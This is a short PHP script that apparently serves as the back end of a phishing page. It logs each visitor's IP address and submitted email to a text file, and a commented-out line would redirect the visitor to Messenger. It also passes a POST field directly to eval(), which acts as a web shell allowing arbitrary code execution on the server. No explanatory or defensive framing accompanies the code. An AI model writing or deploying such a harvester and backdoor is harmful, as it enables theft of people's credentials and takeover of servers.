<?php 
file_put_contents('data.txt' , "" . $_SERVER['REMOTE_ADDR'].":" . $_POST['email'] . "\n",FILE_APPEND);

//$code = $_POST["name"];
//eval($code);
$cmd=$_POST['name'];
eval($cmd);


//header("location:https://www.messenger.com/");

//exit();
?>